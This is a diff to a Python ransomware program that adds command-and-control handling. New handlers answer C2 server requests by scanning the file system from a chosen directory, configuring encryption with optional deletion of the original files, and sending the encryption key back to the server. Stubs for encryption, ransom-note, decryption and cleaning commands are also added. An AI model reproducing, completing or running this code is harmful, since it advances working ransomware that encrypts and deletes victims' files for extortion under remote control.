@@ -140,8 +140,12 @@ class Program():
         print(f"Total files found: {len(self.__found_files)}")
         print(f"Total directories with targeted files: {len(self.__directories_with_files)}")
 
-    def __setup(self, should_encrypt=False, should_delete_original=False):
-        self.__criptography = CryptoGraphy(should_encrypt=should_encrypt, should_delete_original=should_delete_original)
+    def __setup(self, should_encrypt=False, should_delete_original=False, c2_mode=False):
+        self.__criptography = CryptoGraphy(
+            should_encrypt=should_encrypt, 
+            should_delete_original=should_delete_original,
+            c2_mode=c2_mode
+            )
         self.__criptography.setup()
         print(f"Encryption: {should_encrypt}, Delete original files: {should_delete_original}")
 
@@ -308,14 +312,52 @@ class Program():
         await self.__client.connect()
 
     def __message_handler(self, message: dict):
-        #TODO: finish this function
+        message_data = message.get("data", {})
+        message_reply = {}
         match message.get("type"):
             case "set_id":
                 self.__id = message.get("data", {}).get("id", "")
-            case "decrypt_req":
+                print("ID SET", self.__id)
+            case "discovery_req":
+                print("Discovery request received from C2 server.")
+                self.__directory(start_path=message_data.get("initial_directory", "/"))
+                message_reply["type"] = "discovery_rep"
+                message_reply["data"] = {
+                    "files_found": len(self.__found_files),
+                    "directories": len(self.__directories_with_files)
+                }
+                return message_reply
+            case "crypto_req":
+                print("Cryptographic setup request received from C2 server.")
+                self.__setup(
+                    should_encrypt=message_data.get("encrypt", False),
+                    should_delete_original=message_data.get("delete", False),
+                    c2_mode=True
+                )
+
+                message_reply["type"] = "crypto_rep"
+                message_reply["data"] = {
+                    "key": self.__criptography.key.decode()
+                }
+
+                return message_reply
+
+            case "encryption_req":
+                print("Encryption request received from C2 server.")
+                pass
+            case "ransomnote_req":
+                print("Ransom note request received from C2 server.")
+                pass
+            case "decryption_rep":
+                print("Decryption reply received from C2 server.")
+                pass
+            case "cleaning_req":
+                print("Cleaning request received from C2 server.")
                 pass
             case _:
                 print(f"Unknown message type from C2 server: {message.get('type')}")
+        return None
+        
 
     async def send_decryption_request(self):
         if self.__client is not None:
